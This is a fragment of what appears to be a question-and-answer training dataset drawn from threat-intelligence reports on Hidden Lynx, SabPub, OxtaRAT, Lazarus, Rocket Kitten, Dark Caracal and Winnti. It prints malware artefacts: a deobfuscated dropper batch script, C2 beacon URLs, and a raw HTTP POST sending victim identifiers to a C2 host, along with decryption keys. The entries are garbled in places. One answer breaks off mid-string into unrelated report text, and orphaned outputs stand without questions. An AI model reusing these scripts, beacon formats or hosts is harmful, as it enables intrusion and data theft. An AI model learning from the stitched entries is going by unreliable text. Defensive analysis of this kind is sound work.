Trojans signed include variants of Backdoor.Hikit (the remote access Trojan used in the initial compromise) and another RAT called Trojan.Naid. Some malicious attack scripts were also signed. Each Trojan has a specific purpose. Backdoor.Hikit was used to target public-facing infrastructure while Trojan. Naid was used to perform highly targeted attacks through email and watering-holes.\nBit9 was alerted to the compromise in January 2013 and took immediate containment steps such as revoking the digital signature and reaching out to their entire customer base. According to Bit9, the attacks that followed\nwere not financially motivated, but rather were an attempt to access information. On Bit9's own admission, three customers were impacted.\nIn conjunction with the Bit9 compromise, the Hidden Lynx group had another significant campaign well under way. They had just concluded phase one of the VOHO campaign, a watering-hole operation orchestrated to attack organizations in the Boston, Massachusetts area \u2013 it was a likely a distribution vector for the newly signed files.\n\nQuestion: What strategies did the Hidden Lynx group employ to distribute their custom Trojans, and how did they leverage the Bit9 compromise to enhance their operations?\n\nAnswer:",
    "output": "The Hidden Lynx group employed several strategies to distribute their custom Trojans, including watering-hole attacks, spear-phishing, and supply chain attacks. In the Bit9 incident, they leveraged the compromise by signing malicious files with Bit9's digital code-signing certificate, allowing these files to bypass Bit9's trust-based security platform. This enabled them to distribute Trojans like Backdoor.Hikit and Trojan.Naid more effectively. Additionally, the VOHO campaign, which was a watering-hole operation targeting organizations in the Boston area, likely served as a distribution vector for the newly signed files. This multi-faceted approach showcases the group's advanced capabilities and resourcefulness in achieving their objectives.",

    "instruction": "Context: Big Headline: We can therefore confirm SabPub as APT in active stage.\nOn Sunday midday, the C&C domain was shutdown and the bot lost connection to it; this appears to be an initiative from the free DNS service onedumb.com and it was no doubt triggered by the media attention. Interestingly, the VPS used as the C&C is still active.\nWhile analysing SabPub, we discovered another version of the backdoor which seems to have been created earlier. This version differs from the original one only slightly -- the hardcoded C&C address is different --instead of the onedumb.com subdomain used by the original sample (hardcoded in the bot as \"e3SCNUA2Om97ZXJ1fGI+Y4Bt\"), this one simply contains the IP address of the VPS (hardcoded as \"OjlDLjw5Pi4+NUAuQDBA\"), meaning, it should still be operational. Its size is 42556 bytes vs 42580 for the original one.\nOne of the biggest mysteries is the infection vector of these attacks. Given the highly targeted nature of the attack, there are very few traces. Nevertheless, we found an important detail which is the missing link: Six Microsoft Word documents, which we detect as Exploit.MSWord.CVE-2009-0563.a. In total we have six relevant Word .docs with this verdict -- with four dropping the MaControl bot. The remaining two drop SabPub.\nThe most interesting thing here is the history of the second SabPub variant. In our virus collection, it is named \"8958.doc\". This suggests iit was extracted from a Word document or was distributed as a Doc-file.\nWe performed an analysis of the same and traced its origin by the MD5 (40C8786A4887A763D8F3E5243724D1C9). The results were fascinating:\n- The sample was uploaded to VirusTotal on February 25, 2012 \u2013 from two sources in the U.S.\n- In both cases, the original file name was \"10th March Statemnet\" (yes, with the typo and without extension)\n- Zero detections on VirusTotal at that time (0/40)\nIn case you are wondering, the name of the file (\"10th March Statemnet\") is directly linked with the Dalai-Lama and Tibetan community. On March 10, 2011, the Dalai-Lama released a special statement related to Anniversary of the Tibetan People's National Uprising Day -- hence the name.\nBig Headline: Properties field of a document used to spread SabPub\nUnfortunately there is little information in the doc files, but the Author field and the creation date are interesting. In particular, if we trust the creation date, this means the container DOC was created in August 2010 and it was updated in 2012 with the SabPub sample. This is quite normal for such attacks and we have seen it in other cases, for instance, Duqu.\nWe think the above facts show a direct connection between the SabPub and Luckycat APT attacks. We are pretty sure the SabPub backdoor was created as far back as February 2012 and was distributed via spear-phishing emails.\nIt is also important to point that SabPub isn't backdoor MaControl (the case was described (<http://labs.alienvault.com/labs/index.php/2012/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-control-rat/>)here) but still\nuses the same topics to trick victims into opening it. SabPub was the more effective attack because it remained undetected for almost two months!\nThe second variant of SabPub was created in March and the attackers are using Java exploits to infect target Mac OS X machines.\nSabPub is still an active attack and we expect the attackers will release new variants of the bot with new C2s over the next days/weeks.\nBig Headline: To summarize:\n- At least two variants of the SabPub bot exist today.\n- The earliest version of the bot appears to have been created and used in February 2012.\n- The malware is being spread through Word documents that exploit the (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0563>)CVE-2009-0563 vulnerability.\n- SabPub is different from MaControl, another bot used in APT attacks in February 2012; SabPub was more effective because it stayed undetected for more than 1.5 months.\n- the APT behind SabPub is active at the time of writing.\n* Thanks to Aleks Gostev and Igor Soumenkov for the analysis.\n\nQuestion: What key differences exist between the two variants of the SabPub backdoor, and how does the second variant differ in terms of its infection method compared to the first?\n\nAnswer:",
    "output": "The two variants of the SabPub backdoor differ primarily in their hardcoded C&C addresses. The original sample uses a subdomain from onedumb.com (hardcoded as 'e3SCNUA2Om97ZXJ1fGI+Y4Bt'), while the second variant uses the IP address of the VPS directly (hardcoded as 'OjlDLjw5Pi4+NUAuQDBA'). The second variant is slightly smaller in size, 42556 bytes versus 42580 bytes for the original.

The tool capabilities include searching for and exfiltrating files from the infected machine, recording the video from the web camera and desktop, remotely controlling the compromised machine with TightVNC, installing a web shell, performing port scanning, and more.\nCompared to previous campaigns of this threat actor, the latest campaign from November 2022 presents changes in the infection chain, improved operational security, and new functionality to improve the ways to steal the victim's data.\nThe threat actors behind these attacks have been targeting human rights organizations, dissidents, and independent media in Azerbaijan for several years. This is the first time there is a clear indication of these attackers using OxtaRAT against Armenian targets and targeting corporate environments.\nIn this report, we provide a full technical analysis of the OxtaRAT as well as its capabilities and evolution over the years. We also discuss the tactics, techniques and procedures (TTPs) of the threat actors, complete with an overview of their activity throughout the years.\nBig Headline: The Infection Chain\nA malicious file named Israeli_NGO_thanks_Artsakh_bank_for_the_support_of.scr was submitted to VirusTotal (VT) on November 29, 2022, from an IP address located in Yerevan, Armenia.\nIt is a self-extracting archive that masquerades as a PDF file and bears a PDF icon. Upon execution, it drops to the Temp folder of the infected device and executes a self-extracting cab called Alexander_Lapshin.EXE . This in turn drops multiple additional files and executes one of them \u2013 the exec.bat script. In its deobfuscated form, this script is very short:\n@echo off\nxcopy /y /e /k /h /i * %appdata%\\Autoit3\\\ncopy /b /y %appdata%\\Autoit3\\Alexander_Lapshin.pdf %temp%\\\nstart %temp%\\Alexander_Lapshin.pdf start %appdata%\\Autoit3\\Autoit3.exe %appdata%\\Autoit3\\icon.png\nexit\nThe exec.bat file is responsible for opening a lure PDF file that contains a (<https://en.wikipedia.org/wiki/Alexander_Lapshin>)Wikipedia article about Alexander Lapshin. At the same time, in the background, it copies multiple auxiliary files and the AutoIt interpreter to %appdata%\\Autoit3\\ and uses it to execute a malicious AutoIt code hidden inside an image called icon.png .\nAlexander Lapshin, a Russian-Israeli travel blogger, journalist, and human rights activist, was detained in Belarus in 2016 and extradited to Azerbaijan. He was sentenced to 3 years in prison for illegally crossing the internationally recognized borders of Azerbaijan, without authorization from the Azerbaijani authorities, in 2011 and 2012 while visiting Nagorno-Karabakh from Armenia. Nine months into his detention, in September 2017, Lapshin was attacked in a solitary confinement cell of a Baku pre-trial detention center. The attack was publicly declared by Azerbaijani officials to be a suicide attempt. Afterward, he was pardoned by the Azerbaijani President and deported to Israel.\nIn 2021, the European Court of Human Rights in the \"\" ruled that Lapshin's right to life had been violated by Azerbaijan authorities and mandated that Azerbaijan pay 30,000 Euros as compensation. After the verdict, Lapshin publicly (<https://www.facebook.com/lapshin/posts/pfbid047bhbtFcrAR7qokkuvgtiTfDgPGaXx54a2qzakeNzeFZusfrJX5md94p6mqpiFiol>)posted a picture of the credit card he opened to receive his compensation, issued by the Armenian Artsakhbank. Likely, this incident made Lapshin's name an attractive lure for the attackers targeting the bank.\nBig Headline: The OxtaRAT Backdoor\nAs we mentioned previously, AutoIT.exe is used to run code from an image called icon.png . This is a polyglot malware, combining valid JPEG and AutoIT A3X file formats:\nAutoIT is a legitimate tool that is used by many IT administrators to automate tasks but is frequently abused by threat actors. In this case, the actors use a fully functional backdoor containing approximately 20,000 lines of obfuscated AutoIt code:\nThe backdoor, which we call OxtaRAT, contains a variety of capabilities typically associated with espionage activity. It contains commands that allow the attackers to:\nRun additional code on the infected machine, install a PHP web shell, download, upload and execute files.\nSearch and exfiltrate files from specific locations or with specific patterns, and even install the (<https://github.com/dulldusk/phpfm>)PHP FileManager for easier access to and management of the files.\nPerform active surveillance activity: record video from a web camera or desktop, and install additional software, such as TightVNC, to remotely control and monitor the machine.\nPerform recon on the local machine, such as getting information about the processes, drives, system information, and the speed of the internet connection using Speedtest.\nUse a compromised host as a pivot to move through the network: perform port scanning and use Putty's plink for tunneled communication.\nBig Headline: Execution flow\nThe backdoor starts by first setting up its base folder, moving the icon.png file there, and adding a persistence mechanism to run it every 2 minutes with AutoIt3.exe via a scheduled task named WallPaperChangeApp . It also creates a working folder to store the results and logs of each command execution and sets hidden and system attributes for both base and working folders to conceal them from being easily discovered and arouse suspicion. It also downloads the legitimate curl executable and DLL, which are later used for some types of C&C communication.\nThe C&C server for this sample is edupoliceam[.]info , a lookalike for the domain of the Police Education Complex of Police of the Republic of Armenia.\nNext, the malware enters the main infinite loop, where in each step it performs the following actions:\nCreates a screenshot of the infected computer.\nSends a GET request to the C&C server to report the victim's basic information: https://edupoliceam[.]info/upload.php?GUID= <guid>&SYS=PC_Name|User_Name|IP_address .\nUploads (using curl) to the C&C server all the files from the working folder which contain screenshots and the results and logs of the previous command execution.\nSends a GET request to C&C server to retrieve the command from the URL: https://edupoliceam[.]info/upload.php?GUID= <guid>&come=1 .\nMost of the capabilities require additional files, mostly legitimate, to be downloaded during the malware execution from the path on the server /requirement/up/bin/ :\n/requirement/up/bin/postup.exe (curl.exe) /requirement/up/bin/libcurl.dll /requirement/up/bin/vlc.zip /requirement/up/bin/7zxa.dll /requirement/up/bin/7za.exe /requirement/up/bin/7za.dll /requirement/up/bin/pscclient.exe (port scanner) /requirement/up/bin/ptun.exe (Plink) /requirement/up/bin/wintight.exe (TightVNC) /requirement/up/bin/wsrrun.exe (PHP CLI and PHP File Manager, (<https://sourceforge.net/projects/phpfm/>)https://sourceforge.net/projects/phpfm/) /requirement/up/bin/WinRAR32.zip /requirement/up/bin/WinRAR64.zip /requirement/up/bin/speedtest.zip (based on (<https://github.com/sivel/speedtest-cli>)https://github.com/sivel/speedtest-cli)\n/requirement/up/bin/AppCrashCollector.exe (the \"implant\")\nThe only next-stage tool that wasn't available on the server, was AppCrashCollector.exe , whose download and execution are triggered by the implant command. We assume that this is the payload that the actors attempt to hide from researchers and deliver to important targets only after additional checks are performed on the infected machine.\n\nHow does the OxtaRAT backdoor establish persistence on an infected machine, and what mechanisms does it use to communicate with its Command and Control (C&C) server?",
    "output": "The OxtaRAT backdoor establishes persistence by creating a scheduled task named 'WallPaperChangeApp' that runs every 2 minutes. It uses AutoIt3.exe to execute the malicious code hidden inside an image called icon.png. For C&C communication, the malware downloads the legitimate curl executable and DLL. It sends GET requests to the C&C server at edupoliceam[.]info to report the victim's basic information and retrieve commands. It also uploads files to the C&C server using curl.",

    "output": "Reconnaissance is a critical phase in the adversary lifecycle where attackers gather information to plan and execute future operations. In the case of the Transparent Tribe's latest campaign, the use of a Python-based stager and .NET-based reconnaissance tools suggests a deliberate effort to gather information about their targets. The deployment of these tools, alongside the CrimsonRAT, allows the attackers to collect valuable information about the victim organization, infrastructure, and personnel. This information can be leveraged to support targeting, plan and execute initial access, and scope and prioritize post-compromise objectives. For instance, the reconnaissance tools may be used to identify vulnerabilities, map network architecture, or gather credentials, ultimately enabling the attackers to refine their tactics and increase the effectiveness of their operations. By incorporating reconnaissance tools into their campaign, the Transparent Tribe demonstrates a sophisticated understanding of the adversary lifecycle and a commitment to gathering the intelligence needed to achieve their objectives.",

    "instruction": "Big Headline: intrODuCtiOn\nState-sponsored cyberwarfare is no different than physical battles or terrorist attacks in terms of scope and damage. Arguably, cyber attacks are much worse because the identity of attackers are easily concealed, slowing down any process that could bring perpetrators to justice. Attackers are also not restricted by time and location. Interestingly, Middle Eastern countries and some members of the European Union (EU) have recently figured in targeted attacks, either as an aggressor or a victim, for seemingly political reasons.\nAt the recently concluded \"31st Chaos Communication Congress of the Chaos Computer Club (31C3),\" cybersecurity researchers discussed the ways and means by which threat actors can use widely available software to cover their tracks and carry out their campaigns. [1] The focus of this particular lecture was the GHOLE malware used in targeted attack campaigns. GHOLE is believed to have been active since 2011 based on the compilation date of its oldest samples.\nTargeted attacks are well-planned cyberthreat activities aimed at specific organizations. In this paper, we delve into the malicious activities of a cyberthreat group, known in the cybersecurity industry as Rocket Kitten, which has been hitting different public and private Israeli and European organizations. Rocket Kitten has so far launched two campaigns\u2014\"GHOLE\" malware attacks and one we have dubbed \"Operation Woolen-GoldFish.\" We named it as such because \"Woolen\" is attributed to the malware developer and one of the threat actors behind this campaign; \"GoldFish\" serves as an attribute to the location of origin with which the campaign was seemingly launched from.\nThe Rocket Kitten group used spear-phishing emails in order to penetrate their target systems. Based on the malware samples we have obtained from files with macro malware specific to the GHOLE malware campaign, we found that they were mostly interested in the defense industry, the IT sector, government entities, and academic organizations. Certain details from the malware samples show that Operation Woolen-GoldFish was most likely to be a state-sponsored campaign.\nQuestion: How did the Rocket Kitten group leverage widely available software to cover their tracks during their Operation Woolen-GoldFish campaign? What specific tactics did they employ to achieve this, and why were these methods effective in evading detection?",
    "output": "Answer: The Rocket Kitten group utilized widely available software to cover their tracks during the Operation Woolen-GoldFish campaign. One of the primary tactics they employed was the use of spear-phishing emails to penetrate their target systems. These emails contained macro malware specific to the GHOLE malware campaign, which allowed the group to gain unauthorized access to the systems of their targets. The effectiveness of these methods lies in the fact that spear-phishing emails are often tailored to appear legitimate, making them more likely to be opened by unsuspecting recipients. Additionally, the use of macro malware embedded in common file types, such as documents, makes it easier for the malware to bypass traditional antivirus solutions and remain undetected. This combination of social engineering and technical exploitation enabled Rocket Kitten to successfully infiltrate various organizations, including those in the defense industry, IT sector, government entities, and academic organizations.",

    "instruction": "Lazarus Trojanized DeFi app for delivering malware\nAuthors\nFor the Lazarus threat actor, financial gain is one of the prime motivations, with a particular emphasis on the cryptocurrency business. As the price of cryptocurrency surges, and the popularity of non-fungible token (NFT) and decentralized finance (DeFi) businesses continues to swell, the Lazarus group's targeting of the financial industry keeps evolving.\nWe recently discovered a Trojanized DeFi application that was compiled in November 2021. This application contains a legitimate program called DeFi Wallet that saves and manages a cryptocurrency wallet, but also implants a malicious file when executed. This malware is a full-featured backdoor containing sufficient capabilities to control the compromised victim. After looking into the functionalities of this backdoor, we discovered numerous overlaps with other tools used by the Lazarus group.\nThe malware operator exclusively used compromised web servers located in South Korea for this attack. To take over the servers, we worked closely with the  and, as a result of this effort, we had an opportunity to investigate a Lazarus group C2 server. The threat actor configured this infrastructure with servers set up as multiple stages. The first stage is the source for the backdoor while the goal of the second stage servers is to communicate with the implants. This is a common scheme used in Lazarus infrastructure.\nBig Headline: Initial infection\nWhile it's still unclear how the threat actor tricked the victim into executing the Trojanized application ((<https://opentip.kaspersky.com/0b9f4612cdfe763b3d8c8a956157474a/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)0b9f4612cdfe763b3d8c8a956157474a), we suspect they sent a spear-phishing email or contacted the victim through social media. The hitherto unknown infection procedure starts with the Trojanized application. This installation package is disguised as a DeFi Wallet program containing a legitimate binary repackaged with the installer.\nUpon execution, it acquires the next stage malware path (C:\\ProgramData\\Microsoft\\GoogleChrome.exe) and decrypts it with a one-byte XOR (Key: 0x5D). In the process of creating this next malware stage, the installer writes the first eight bytes including the 'MZ' header to the file GoogleChrome.exe and pushes the remaining 71,164 bytes from the data section of the Trojanized application. Next, the malware loads the resource CITRIX_MEETINGS from its body and saves it to the path C:\\ProgramData\\Microsoft\\CM202025.exe. The resulting file is a legitimate DeFi Wallet application. Eventually, it executes the previously created malware with its file name as a parameter:\nC:\\ProgramData\\Microsoft\\GoogleChrome.exe \"[current file name]\"\nBig Headline: Backdoor creation\nThe malware ((<https://opentip.kaspersky.com/d65509f10b432f9bbeacfc39a3506e23/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)d65509f10b432f9bbeacfc39a3506e23) generated by the above Trojanized application is disguised as a benign instance of the Google Chrome browser. Upon launch, the malware checks if it was provided with one argument before attempting to copy the legitimate application \"C:\\ProgramData\\Microsoft\\CM202025.exe\" to the path given as the command line parameter, which means overwriting the original Trojanized installer, almost certainly in an attempt to conceal its prior existence. Next, the malware executes the legitimate file to deceive the victim by showing its benign installation process. When the user executes the newly installed program, it shows the DeFi Wallet software built with the public source code.\nScreenshot of the manipulated application\nNext, the malware starts initializing the configuration information. The configuration shows the structure shown in the table below, consisting of flags, C2 server addresses, victim identification value, and time value. As the structure suggests, this malware can hold up to five C2 addresses, but only three C2 servers are included in this case.\nThe malware randomly chooses a C2 server address and sends a beacon signal to it. This signal is a hard-coded '0x60D49D94' DWORD without encryption; the response data returned from the C2 carries the same value. If the expected value from the C2 server is received, the malware starts its backdoor operation.\nFollowing further communication with the C2, the malware encrypts data by a predefined method. The encryption is done via RC4 and the hard-coded key 0xD5A3 before additionally being encoded with base64.\nThe malware generates POST parameters with hard-coded names. The request type (msgID), victim identification value, and a randomly generated value are merged into the 'jsessid' parameter. It also uses the 'cookie' parameter to store four randomly generated four-byte values. These values are again encrypted with RC4 and additionally base64 encoded. Based on our investigation of the C2 script, we observed this malware not only uses a parameter named 'jsessid', but also 'jcookie' as well.\nMedium Headline: Structure of 'jsessid' parameter\nThe following HTTP request shows the malware attempting to connect to the C2 with the request type '60d49d98\u2032 and a randomly generated cookie value.\n1 POST /include/inc.asp HTTP/1.1\n2 Content-Type: application/x-www-form-urlencoded\n3 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 4 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)\n5 Host: emsystec.com\n6\nContent-Length: 80\n7 Cache-Control: no-cache\n8\njsessid=60d49d980163be8f00019f91&cookie=29f23f917ab01aa8lJ3UYA==2517757b7dfb47f1\nDepending on the response from the C2, the malware performs its instructed backdoor task. It carries various functionalities to gather system information and control the victim machine.\nBig Headline: Infrastructure\nLazarus only used compromised web servers located in South Korea in this campaign. As a result of working closely with the  in taking down some of them, we had a chance to look into the corresponding C2 script from one of the compromised servers. The script described in this section was discovered in the following path:\n1 http://bn-cosmo[.]com/customer/board_replay[.]asp\nThe script is a VBScript.Encode ASP file, commonly used by the Lazarus group in their C2 scripts. After decoding, it shows the string '60d49d95\u2032 as an error response code, whereas the string '60d49d94\u2032 is used as a success message. In addition, the connection history is saved to the file 'stlogo.jpg' and the C2 address for the next stage is stored in the file 'globals.jpg' located in the same folder.\nMedium Headline: Configuration of C2 script\nThis script checks what value is delivered in the 'jcookie' parameter and, if it's longer than 24 characters, it extracts the first eight characters as msgID. Depending on the msgID value, it calls different functions. The backdoor command and command execution result delivered by the backdoor get stored to global variables. We have seen this scheme in operation before with the Bookcode cluster. This script uses the following variables as flags and buffers to deliver data and commands between the backdoor and a second stage C2 server:\nlFlag: flag to signal that there is data to deliver to the backdoor\nlBuffer: buffer to store data to be later sent to the backdoor\ntFlag: flag to signal that there is a response from the backdoor\ntBuffer: buffer to store incoming data from the backdoor\nBig Headline: Attribution\nWe believe with high confidence that the Lazarus group is linked to this malware as we identified similar malware in the CookieTime cluster. The CookieTime cluster, called  by JPCERT, was a malware cluster that was heavily used by the Lazarus group until recently. We've seen Lazarus group target the defence industry using the CookieTime cluster with a job opportunity decoy. We have already published several reports about this cluster to our Threat Intelligence Service customers, and we identified a Trojanized Citrix application ((<https://opentip.kaspersky.com/5b831eaed711d5c4bc19d7e75fcaf46e/?utm_source=SL&utm_medium=SL&utm_campaign=SL>)5b831eaed711d5c4bc19d7e75fcaf46e) with the same code signature as the CookieTime malware. The backdoor discovered in the latest investigation, and the previously discovered Trojanized application, are almost identical. They share, among other things, the same C2 communication method, backdoor functionalities, random number generation routine and the same method to encrypt communication data. Also, this malware was mentioned in an  by Ahnlab discussing connections with the CookieTime (aka LCPDot) malware.\nMedium Headline: Same backdoor switch of old CookieTime malware\nIn turn, we identified that the CookieTime cluster has ties with the Manuscrypt and ThreatNeedle clusters, which are also attributed to the Lazarus group. This doesn't only apply to the backdoor itself, but also to the C2 scripts, which show several overlaps with the ThreatNeedle cluster. We discovered almost all function and variable names, which means the operators recycled the code base and generated corresponding C2 scripts for the malware.\nBig Headline: Conclusions\nIn a previous investigation we discovered that the  group, which is also linked to Lazarus, compromised another DeFi wallet program called MetaMask. As we can see in the latest case, the Lazarus and BlueNoroff groups attempt to deliver their malware without drawing attention to it and have evolved sophisticated methods to lure their victims. The cryptocurrency and blockchain-based industry continues to grow and attract high levels of investment. For this reason, we strongly believe Lazarus's interest in this industry as a major source of financial gain will not diminish any time soon.\n\nBased on the above text, answer a question. How does the Lazarus group's backdoor malware establish communication with its C2 servers, and what specific actions does it take upon receiving a successful response?",

Additionally, organizations can apply additional scrutiny to all network traffic communicating with suspicious IP addresses and consider blocking certain domains and services, such as Telegram Messaging and domain lookup tools, if they are not necessary for business operations.",

    "instruction": "Big Headline: Infrastructure\nWhile analyzing adobeair[.]net, we uncovered sprawling infrastructure used by Dark Caracal. This infrastructure serves a broad set of purposes, including acting as storage for exfiltrated data, masquerading as an Android App Store hosting malware, delivering attacker commands to infected devices, and providing phishing content aimed at gathering credentials for various  well known services.\nWe found much of this infrastructure hosted on servers provided by Shinjiru, an offshore bulletproof hosting provider that allows its customers to host almost any content. WHOIS information listed for the adobeair[.]net C2 server led to the discovery of many of these domains, as did scanning of Shinjiru IP blocks for servers running a set of services. This acted as a fingerprint for Dark Caracal's infrastructure. To date, the following domains and IPs have been identified as connected to the infrastructure used by Dark Caracal.\nThe following relevant contact information has also been identified during this investigation.\nMedium Headline: Primary Command and Control Server\nAs noted, adobeair[.]net is hosted on Shinjiru. This bulletproof hosting company allows its customers to host almost any type of content, protects client identity, accepts Bitcoin for payment, and is more resilient than other providers to takedowns22 . Shinjiru has also been used to host many of the Dark Caracal Windows domains dating back over seven years to April 27th, 2010 (see a list of Windows malware domains in the Windows infrastructure section below).\nAt the time of writing, adobeair[.]net is currently live and running a fairly unique set of services. We have used this server as a fingerprint in the discovery of further related infrastructure. These services include XAMPP for Windows 5.6.31, Apache 2.4.26, MariaDB 10.1.25, PHP 5.6.31, phpMyAdmin 4.7.0, and OpenSSL 1.0.2. We confirmed these via an nmap scan of the adobeair server.23\n22 (<https://www.shinjiru.com/company/about-us/ >)https://www.shinjiru.com/company/about-us/\n23 (<https://www.apachefriends.org/download.html>)https://www.apachefriends.org/download.html\nThe adobeair[.]net C2 server had the Apache mod_status module enabled. This provides operators with information on server activity, performance, and a statistics page under /server-status that details connected clients and the server resources they are accessing. By programmatically monitoring this page, we were able to determine the source IPs of infected clients and admins logging into the console.\nThe adobeair[.]net server has, as of late September 2017, been moved to a new hosting provider, M247, and the operators have improved the security.\nWHOIS history for adobeair[.]net lists Nancy Razzouk with an email address of op13@mail[.]com as the registrant. We have identified the \"Nancy Razzouk\" persona as the SSL signer of the Windows malware samples and the registrant of multiple domains. Its reuse has helped identify further Dark Caracal infrastructure.\nMedium Headline: Watering Hole Server\nDuring this investigation, we determined this server is the only infrastructure we discovered that serves up malicious apps belonging to the Pallas malware family. A detailed analysis of these applications can be found under the Android Surveillanceware section. As with other Dark Caracal infrastructure, the secureandroid[.]info domain was also registered with the bulletproof hosting company Shinjiru.\nWe found links to these landing pages in the exfiltrated content of compromised devices, which indicates it is actively being used during the attack chain. As of December 2017 it appears that secureandroid[.]info has had its domain expire.\nMedium Headline: Phishing Domains\nWe identified the Dark Caracal domain tweetsfb[.]com while analyzing the secureandroid[.]info server source code. We identified two bit[.]ly URLs on this server that resolve to other pages on the tweetsfb site that were carefully crafted to look like the Facebook and Twitter login portals. The copyright dates suggest these pages are clones of the originals from 2015.\nThese bit[.]ly links and their respective resolving links are:\n\u2022 http://bit[.]ly/2j3r285 points to http://www.tweetsfb[.]com/services/100001472583690/twitter/articles/100001/\n\u2022 http://bit[.]ly/2iByHcu points to http://tweetsfb[.]com/services/100001472583690/facebook/groups/100002/\nThe tweetsfb[.]com domain was found to share an IP address (172.94.17.147) with the following additional domains.\nWe were able to find additional phishing campaigns in VirusTotal that referenced fbarticles[.]com. While fbarticles was registered by the op13@mail[.]com address with the name \"Hadi Mazeh,\" the WHOIS information for fbtweets was private.\nNote: we identified three further domains \u2014 \"facebookservices[.]org\", \"gmailservices[.]org\", and \"twiterservices[.]org\" that were once a part of this campaign. Those domains now appear to be sinkholed.\nWhen we discovered these domains, the threat actors had already taken them offline and another individual had purchased them. This individual is associated with unrelated domains that are connected to other APT reports. However, we noticed that the individual purchased the domains after the APT reports went public. While we're not sure why this individual is purchasing, sinkholing, and monitoring these domains, we think it's an interesting note.\nMedium Headline: Windows C2 Servers\nThe Windows server infrastructure has a much longer history than the Android infrastructure, showing that the actors are willing to evolve to new technologies, such as mobile, as they become more valuable targets.\nThe Windows malware servers hosted control panels for multiple campaigns using various malware that included IRIS RAT, Bandook, and Arcom RAT. We found these servers hosting exfiltrated desktop content, Windows malware signed by \"alecouperus@mail[.]com\", and the CrossRAT trojan.\nAll of these domains share the same IP on more than one occasion and have migrated between hosting providers in the same time window. Most of these domains were hosted on Shinjiru, the same hosting server for the Android campaign.\nThe following screenshot shows HTTP 200 OK response codes for http://<server>/<Payload>/\nEach of the following directories contained a login panel for either IRIS RAT or Arcom RAT.\nUsing the Wayback Machine we identified the signature Win32 apache server running on skypeupdate[.]com in 2016. This server was first seen resolving to an IP belonging to Shinjiru in late 2013 and last seen resolving to a Shinjiru IP in late 2016.\nThe oldest domain we identified as part of this infrastructure is flexberry[.]com. The following screenshot shows passive DNS resolution dating back to 2010.\n\nHow does the infrastructure used by Dark Caracal facilitate its espionage activities, and what specific services were identified on the primary command and control server?",

    "instruction": "Context: Big Headline: FROM INSTALLATION TO EXECUTION\nThe installation process of Winnti by means of the dropper has changed very little since the Winnti version 1.1 (as defined by Kaspersky) droppers of July 2012. The samples Novetta obtained from the active Axiom infection were compiled in mid- to late 2014 and represent what Novetta is referring to as version 3.0 of the Winnti lineage (in order to prevent muddying the versioning scheme Kaspersky has already established).\nThere are four distinct components within the Winnti malware's installation to execution cycle: a dropper, a service, an engine, and a worker. The installation that Novetta observed of Winnti on a victim's machine requires multiple steps and depends on the dropper, service, and the loader component in order to accomplish the steps. After a successful infection, the activation of Winnti on a victim's machine requires multiple steps as well as coordination between the service, engine, and worker components. The complexity of the installation and activation processes is significant and more involved than typical malware installation and activation procedures. This additional complexity ultimately does not seem to serve a significant purpose other than to perhaps frustrate analysis by defenders.\n1 Kaspersky. \"Winnti: More than just a game\". http://kasperskycontenthub.com/wp- content/uploads/sites/43/vlpdfs/winnti-more-than-just-a-game-130410.pdf. 10 April 2014.\nBig Headline: INSTALLATION PHASE 1: DROPPER ACTIVITIES\nThe dropper is, as the name implies, the component responsible for dropping the Winnti malware on a victim's machine. The dropper performs the following activities (with version- specific annotation):\n1. [version 3.0] The dropper verifies the existence of a single parameter on the command line and terminates if the parameter is not found. The dropper later uses this parameter as a decryption key.\n2. The dropper loads CreateProcessA via a call to GetProcAddress.\n3. The dropper extracts an embedded data blob, decrypts the data blob, and decompresses the data blob into a heap buffer.\nThe data blob in step 3 begins with a header structure that describes key attributes of the data blob. The format of the header is as follows:\nIn order to decrypt the data blob, the dropper will iterate over each of the bytes that follows the header (up to the value specified in 0xE offset of the header), XOR the bytes by 0x36, and then perform a nibble swap, ZLib-compressed data immediately follows the header. The dropper will allocate a heap buffer (with a size specified by the value in offset 0xA of the header) and call the ZLib inflate function.\nThe decompressed data blob contains a second header, and the blob's header consists of the following two entries:\n4. The dropper uses the value in offset 0x4 of the decompressed data blob's header to determine the size of the worker component's size and writes that many bytes of the decompressed data blob, starting after the header, to a file within %TEMP%. The file has a random name, but the extension is always .tmp.\n5. [version 3.0] The remaining bytes within the decompressed data blob are decrypted using what appears to be DES encryption and the key the attacker provided via the first argument on the command line.\n6. The dropper generates another randomly named file within %TEMP% with the file extension of .tmp with the remaining bytes within the decompressed data blob. This file becomes the service component.\nThe decryption of the service component is a new feature within the version 3.0 lineage of Winnti and provides the benefit of preventing defenders from attempting to run the dropper for analysis purposes.\n7. [version 3.0] The presence of the MZ magic bytes in the first two bytes of the service component are verified to ensure that the file was properly decrypted (and by extension, to verify that the supplied password was correct). If the MZ bytes are not found, the dropper quietly terminates.\n8. [version 3.0] The filenames and paths of the service and worker components are appended to the end of the worker component's file in a structure 520 byte array. The irst 260 bytes contain the filename and path of the worker component, and the last 260 bytes contain the filename and path of the service component. The entire 520 byte array is encrypted by XOR'ing each byte with 0x99.\n9. The service component's file is scanned for the tag Coopre. If this tag is located, the dropper decrypts the configuration data blob attached to the end of the dropper's executable and appends the data to memory immediately followed the Coopre magic byte. The dropper will then append the filenames and paths of the service and worker components to the end of the worker component's file in a structure 520 byte array. The first 260 bytes contain the filename and path of the worker component, and the last 260 bytes contain the filename and path of the service component. The entire 520 byte array is encrypted by XOR'ing each byte with 0x99.\n10. The dropper instructs the service component to complete the installation by using rundll32 to activate the service component's Install [pre-version 3.0] or DlgProc [version 3.0] function.\nThe service component is self-installing when an attacker (or the dropper) activates the Install or DlgProc export functions. Install or DlgProc requires the full name and path of the dropper component. The service component can locate the worker component based on the appended filename and path strings located at the end of itself. Once the dropper calls CreateProcessA to activate rundll32, the dropper's task is complete, and it quietly terminates. At this point, it is up to the service component to continue to install and, eventually, to activate the Winnti malware.\nBig Headline: INSTALLATION PHASE 2: SERVICE ACTIVITIES\nThe service component is at its core an unsophisticated scaffold whose job is to activate the engine component. The distinction between pre-version 3.0 Winnti variants and version 3.0 variants is most evident in the versions' service components. As a result of the larger difference in procedure between the pre-version 3.0 